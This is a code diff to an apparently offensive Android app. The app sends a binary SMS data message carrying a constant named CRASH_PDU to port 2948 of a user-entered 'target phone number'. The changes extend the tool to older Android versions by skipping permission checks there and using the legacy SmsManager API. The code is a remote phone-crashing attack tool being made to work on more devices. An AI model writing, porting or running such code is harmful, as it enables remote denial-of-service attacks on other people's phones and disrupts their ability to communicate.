@@ -94,13 +94,19 @@ public class MainActivity extends Activity {
         scroll.addView(root, new LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.WRAP_CONTENT));
         setContentView(scroll);
 
-        requestPermissions(new String[] {
-            Manifest.permission.SEND_SMS,
-            Manifest.permission.READ_PHONE_NUMBERS,
-            Manifest.permission.READ_PHONE_STATE
-        }, 1);
+        if (!isLollipop()) {
+            requestPermissions(new String[] {
+                Manifest.permission.SEND_SMS,
+                Manifest.permission.READ_PHONE_NUMBERS,
+                Manifest.permission.READ_PHONE_STATE
+            }, 1);
+        }
 
         populateSubsAndAutofill();
+    }
+
+    private boolean isLollipop() {
+        return android.os.Build.VERSION.SDK_INT < 23;
     }
 
     @Override
@@ -115,7 +121,7 @@ public class MainActivity extends Activity {
                 getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
             if (sm == null) return;
 
-            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+            if (!isLollipop() && checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                 status.setText("Grant READ_PHONE_STATE for SIM enumeration.");
                 return;
             }
@@ -170,6 +176,7 @@ public class MainActivity extends Activity {
      *   5. SubscriptionInfo.getNumber()                     — legacy fallback
      */
     private String resolveNumber(SubscriptionInfo s) {
+        if (isLollipop()) return null; // getPhoneNumber
         if (s == null) return null;
         SubscriptionManager sm = (SubscriptionManager)
             getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
@@ -230,7 +237,7 @@ public class MainActivity extends Activity {
             status.setText("Enter target phone number first.");
             return;
         }
-        if (checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
+        if (!isLollipop() && checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
             status.setText("SEND_SMS not granted.");
             return;
         }
@@ -243,7 +250,7 @@ public class MainActivity extends Activity {
             if (pos < 0 || pos >= subs.size()) pos = 0;
             int subId = subs.get(pos).getSubscriptionId();
 
-            SmsManager mgr = getSystemService(SmsManager.class).createForSubscriptionId(subId);
+            SmsManager mgr = SmsManager.getSmsManagerForSubscriptionId(subId);
             mgr.sendDataMessage(dest, null, (short) 2948, CRASH_PDU, null, null);
 
             String ts = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
